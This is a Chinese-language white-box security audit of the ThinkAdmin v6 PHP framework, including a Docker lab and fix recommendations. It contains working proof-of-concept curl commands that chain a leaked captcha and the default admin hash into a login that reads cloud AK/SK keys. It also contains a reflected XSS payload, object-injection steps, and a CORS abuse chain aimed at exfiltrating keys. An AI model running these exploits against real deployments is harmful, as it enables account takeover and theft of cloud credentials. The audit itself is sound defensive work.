# ThinkAdmin v6 安全审计报告

> 目标：以「未认证 0-click 泄漏云 AK/SK」为核心意图的白盒审计；并提供 Docker 可复现环境。
> 原则：只写已确认事实；每条发现给出完整数据流（`文件:行`）、可达性、PoC、可串联链；并主动排除反证。

## 0. 审计对象与框架字典

| 组件 | 版本 | 说明 |
|---|---|---|
| topthink/framework | v8.1.4 | ThinkPHP 8 基座 |
| topthink/think-orm | v3.0.34 | ORM |
| zoujingli/think-library | v6.1.98 | ThinkAdmin 核心库 |
| zoujingli/think-plugs-admin | v1.0.79 | 后台插件（控制器真身） |
| zoujingli/think-plugs-wechat | v1.0.52 | 微信插件 |
| zoujingli/wechat-developer | v1.1.17 | 微信 SDK |

- **source**：`input()` / `$request->get|post|param` / 路由变量 / 请求头；全局经 `xss_safe()` 过滤（`Library.php` HttpRun）。
- **sink（AK/SK）**：`sysconf('storage.*' / 'wechat.*')` 读写；`system_config` 表**明文**存储全部密钥。
- **鉴权模型（可达性原语）**：
  - `RbacAccess` 中间件对每个路由检查 `rbac_ignore`（=`['index']`，整个 `index` 应用免检）或 `AdminService::check()`。
  - **方法默认公开**：`NodeService::_parseComment`（`service/NodeService.php:214-216`）只在方法注释含 `@auth true` 或 `@login true` 时标记需鉴权；两者皆无 → `AdminService::check()`（`service/AdminService.php:179-212`）返回 `true` → **未认证可访问**。
- `sysconf('')` 空名返回整个配置数组；`SystemService::get()` 非 `|raw` 时仅对值做 `htmlspecialchars`（不影响密钥泄漏）。

**赢的条件**：任何未认证途径读到 `system_config`（SQLi / 配置反射）或取得管理员会话 = 全部 AK/SK 明文。

---

## 1. 高危发现（按严重级排序）

### 🔴 A1 — 验证码明文泄漏 + 默认超管凭据 ⇒ 未认证读取全部云 AK/SK（端到端已现场验证）

- **类别**：认证绕过 / 敏感信息泄漏（反自动化控制失效 → 账号接管 → 密钥泄漏）
- **可达性**：**未认证、0-click**（无需任何受害者交互）；前置条件：默认口令未修改（或配合 A5 在线暴破弱口令）。
- **位置 / 数据流**：
  1. `app/admin/controller/Login.php:123-125` — `captcha()`：当会话无 `LoginInputSessionError` 标志时，JSON 响应直接回显明文验证码：
     ```php
     if (!$this->app->session->get('LoginInputSessionError')) {
         $captcha['code'] = $image->getCode();   // ← 明文验证码泄漏
     }
     ```
  2. `vendor/.../support/middleware/JwtSession.php:77-82` — 会话 ID 由请求参数 `var_session_id` 或 cookie 决定（**攻击者可控**）；每次用全新会话即可保证无错误标志 → 验证码恒泄漏；登录动作**无限流、无锁定**。
  3. `app/admin/controller/Login.php:93` — 口令校验 `md5("{$user['password']}{$data['uniqid']}") !== $data['password']`：以**存储哈希**作为登录共享秘密。默认超管 `admin` 的哈希 = `md5("admin")` = `21232f297a57a5a743894a0e4a801fc3`（公开），攻击者构造 `password = md5("21232f...".uniqid)` 即可登录，无需明文口令。
  4. `config/app.php:25` `super_user=admin` → `AdminService::check()`（`AdminService.php:199`）对超管直接放行 → `admin/config/storage?type=alioss|txcos|qiniu|upyun` 表单以 `value="{:sysconf('storage.xxx_secret_key')}"` **明文回显** AK/SK。
- **PoC（已在复现环境验证成功）**：
  ```bash
  # 1) 未认证取验证码，直接得到明文 code 与 uniqid
  curl -s -c cj.txt "http://TARGET/admin/login/captcha.html?type=LoginCaptcha&token=x"
  #    → {"data":{"uniqid":"captcha...","code":"E9U6"}}
  # 2) 用公开的默认超管哈希构造应答登录
  PASS=$(php -r 'echo md5("21232f297a57a5a743894a0e4a801fc3"."<uniqid>");')
  curl -s -b cj.txt -c cj.txt -X POST "http://TARGET/admin/login/index.html" \
       -d "username=admin&verify=<code>&uniqid=<uniqid>&password=$PASS"
  #    → {"code":1,"info":"登录成功"}
  # 3) 读取云存储 AK/SK
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=alioss"  # alioss_access_key / alioss_secret_key
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=txcos"   # txcos_access_key  / txcos_secret_key
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=qiniu"   # qiniu_access_key  / qiniu_secret_key
  ```
  完整脚本见 `docker-poc/poc_exploit.sh`。
- **反证排除**：登录唯一的反自动化控制是图形验证码，已被明文泄漏击穿；读取配置为 GET 且后台无 CSRF 限制读取；无登录限流/锁定；用户名查询为 ORM 参数化（无 SQLi），口令比较用严格 `!==`（无类型混淆）——但这些都不影响本链成立。
- **攻击链**：泄漏的 AK/SK → 直接调用对应云服务（OSS/COS/七牛对象存储读写、接管存储桶）。

### 🔴 A2 — 可预测/空 `data.jwtkey` ⇒ 未认证 PHP 对象注入（`unserialize`）

- **类别**：不安全反序列化（PHP Object Injection）
- **可达性**：**未认证、0-click**；前置条件：`data.jwtkey` 为空或弱/可预测。
  - 何时为空：全新实例且管理员**尚未保存过系统配置**、且该实例走 cookie 会话（从未因 `jwt-token` 请求触发 `JwtExtend::jwtkey()` 的自动随机生成）。纯后台（cookie）部署常年处于此状态。
- **位置 / 数据流**：
  - `vendor/.../extend/CodeExtend.php:139` — `decrypt()` 末尾：
    ```php
    return unserialize(openssl_decrypt($attr['value'], 'AES-256-CBC', $skey, 0, $attr['iv']));
    ```
  - 未认证 sink：`GET /admin/api.plugs/script?uptoken=<forged>`（`app/admin/controller/api/Plugs.php:82`，方法无 `@auth/@login`）
    → `AdminService::withUploadUnid($token)`（`service/AdminService.php:298`）
    → `CodeExtend::decrypt($uptoken, sysconf('data.jwtkey'))` → `unserialize()`。
  - 密钥已知/空时，攻击者用相同密钥 `CodeExtend::encrypt(serialize($gadget), $key)` 即可伪造出会被 `unserialize` 的 token。空密钥时 AES-256-CBC 使用全零密钥，结果确定。
- **PoC（对象注入原语已现场验证）**：见 `docker-poc/poc_deser.php`，空密钥 `''` 与可预测密钥均成功触发攻击者对象的 `__wakeup()`/`__destruct()`，攻击者完全控制 `unserialize` 的对象类型与属性。
- **到 AK/SK 的完整利用（SUSPECTED，未证实）**：需要 POP gadget 链实现文件读取 / SQL / RCE 以读取 `system_config`。**本依赖集未找到现成 gadget**：think-orm v3.0.34 已移除经典的 `Model::__destruct → save` 懒保存链（`Model::__wakeup` 仅 `initialize()`，`Connection::__destruct` 仅 `close()`，均无害）。故此条记为**已确认的对象注入原语**，完整到 AK/SK 的链未证实；若引入含魔术方法 gadget 的第三方依赖则可升级为 RCE。
- **另一 sink 的证伪**：`jwt-token` 头 → `JwtExtend::verify` → `decrypt($payload['enc'])` 也走 `unserialize`，但 `verify` 内 `jwtkey()` 在密钥为空时会**先自动生成随机密钥并持久化再验签**（`JwtExtend.php:188-215`），攻击者空密钥签名失败——此 sink 空密钥不可伪造（自愈）。**仅 uptoken sink 在空/弱密钥下可用**。

### 🟠 A3 — CORS 任意源反射 + 携带凭据（链条元素）

- **类别**：CORS 配置错误
- **可达性**：未认证可触发响应头，但形成危害需**诱导已登录管理员**访问恶意页（1-click，非 0-click）。
- **位置 / 数据流**：`vendor/.../Library.php` register() 的 CORS 中间件：`app.cors_on` 默认 `true`；`app.cors_host` 默认空 → `empty($hosts)` 成立 → 回显任意 `Origin`，并设 `Access-Control-Allow-Credentials: true`。
- **验证**：`Origin: https://evil.example.com` → 响应 `Access-Control-Allow-Origin: https://evil.example.com` + `Allow-Credentials: true`（已现场确认）。
- **攻击链**：管理员访问攻击者页面 → 跨域带 cookie 请求 `admin/config/storage` → 读取 AK/SK 回传。

### 🟠 A4 — 微信内容展示接口未认证反射型 XSS（链条元素）

- **类别**：反射型 XSS
- **可达性**：未认证可达；危害需受害者点击（1-click）。
- **位置 / 数据流**：`app/wechat/controller/api/View.php`（`text/image/video/voice/music`）：`strip_tags(input('content'), '<a><img>')` 保留 `<img>` → 模板 `{$content|raw}` 原样输出。
- **验证**：`GET /wechat/api.view/text.html?content=<img src=x onerror=alert(document.domain)>` 原样回显（已现场确认）。
- **攻击链**：与后台同源 → 诱导已登录管理员点击 → XSS 同源 `fetch('/admin/config/storage?type=alioss')` 读取并外带 AK/SK（无需 CORS）。

### 🟡 A5 — 口令存储为无盐 MD5 + 默认 `admin/admin`（放大 A1）

- **类别**：弱口令哈希 / 默认凭据
- **位置**：`SystemUser` 口令 = `md5($password)` 无盐（`app/admin/controller/Index.php:131` 等）；安装种子 `database/migrations/20241010000002_install_admin20241011.php:62` 植入 `admin`=`md5("admin")`。
- **影响**：配合 A1 的验证码击穿与无限流，可对任意账号在线无限暴破；无盐 MD5 口令一旦库被读出即秒解。

---

## 2. 已覆盖维度与结论

| 维度 | 结论 | 关键证据 |
|---|---|---|
| 认证/授权绕过 | 鉴权模型厘清；A1 账号接管链成立；JWT 伪造成 admin **证伪** | `AdminService.php:179-212`；`JwtExtend::verify` 空密钥自愈 |
| 不安全反序列化 | A2 对象注入原语**确认**；到 RCE 的 gadget 未证实 | `CodeExtend.php:139`；think-orm 3.x 已去链 |
| SQL 注入（未认证） | **证伪**：值全绑定、标识符严格校验、表/字段名硬编码 | `think-orm Builder/Mysql parseKey`；`QueryHelper` 字段由控制器硬编码 |
| 排序注入（layTable） | **证伪**：`parseOrder` 用 `/^[\w\.]+$/` + ASC/DESC 白名单 | `think-orm Builder.php:539-556` |
| 命令注入 | 未认证面无 `exec/system/proc_open` 可控入口 | 全仓 grep |
| SSTI / 模板注入 | **证伪**：模板名硬编码，变量仅运行时 echo 不编译 | think-template `fetch`；`display()` 零输入调用 |
| 文件读取 / LFI | **证伪**：未认证面无输入拼接的 `include/file_get_contents` 路径 | — |
| 多语言 LFI/RCE | **证伪**：`detect` 正则 `/^([a-z\d\-]+)/i` + `allow_lang_list=['zh-cn']` | framework `LoadLangPack` |
| SSRF | **证伪**：微信 SDK host 硬编码；`MediaService::upload` 的 URL 取自管理员设的 DB 行 | `wechat-developer Oauth/Script`；`MediaService` |
| 硬编码/默认密钥 | A2（空/弱 jwtkey）、A5（默认口令/无盐 md5）**确认** | `CodeExtend`、安装种子 |
| 依赖 CVE | `composer audit` 无已知通告 | — |
| 越权逻辑 | `Upload::state` 泄 AK 路径**证伪**（`withUploadToken` 全仓零调用，`AdminUploadUnid` 永不被设） | `AdminService.php:279-328` |
| CORS / XSS | A3 / A4 **确认**（链条元素） | `Library.php`、`View.php` |

## 3. 未覆盖项及原因

- **A2 的完整 POP gadget 链（→ RCE/文件读 → AK/SK）**：在当前精确依赖集中未找到可用魔术方法 gadget（think-orm 3.x 已移除经典链），构造成本高且结果不确定，未继续深挖；若目标实例安装了其它含 `__destruct/__wakeup` 副作用的第三方包，可重新评估。
- **会员前端上传插件**（`think-plugs-static` 之外的会员上传能力）：会调用 `AdminService::withUploadToken()`，本安装未包含该调用方，故 `Upload::state` 的未认证 AK 回显路径在本安装不可达；若装了相关会员插件需回归审计。
- **第三方消息模式（`wechat.type=thr`）下 `Push::index` 的动态方法调用**：默认 `api` 模式未走该分支，未展开。

---

## 4. 复现环境（Docker）

见 `docker-poc/`：
- `Dockerfile` / `docker-compose.yml`：PHP 8.3 + SQLite，复用已安装的 `vendor/`；
- `entrypoint.sh`：建库迁移（种子 `admin/admin`）+ 注入模拟 AK/SK + 启动内置服务器（:8099）；
- `seed.php`：写入与 think-library 存储类一致键名的模拟密钥（`storage.alioss_secret_key` 等）；
- `poc_exploit.sh`：A1 端到端利用（验证码泄漏 → 默认登录 → 读 AK/SK）；
- `poc_deser.php`：A2 对象注入原语验证。

```bash
docker compose -f docker-poc/docker-compose.yml up --build
# 浏览器 http://127.0.0.1:8099/admin/login/index.html  (admin/admin)
bash docker-poc/poc_exploit.sh http://127.0.0.1:8099
```

## 5. 修复建议（摘要）

1. **A1**：`captcha()` 任何情况下都不返回明文 `code`；验证码一次性失效、绑定会话、服务端比对；登录加失败限流/锁定；安装流程强制改默认口令。
2. **A2**：禁止 `decrypt()` 直接 `unserialize`，改为 `json_decode` 或 `unserialize($x, ['allowed_classes'=>false])`；`data.jwtkey` 安装时强制随机生成并校验长度，杜绝空/弱值。
3. **A3**：`cors_host` 默认不回显任意源；`Allow-Credentials: true` 时必须显式白名单且不得使用 `*`/回显。
4. **A4**：`View::*` 输出改为转义（去掉 `|raw`），或对 `content` 做严格白名单净化。
5. **A5**：口令改为带盐的强哈希（password_hash/bcrypt）。
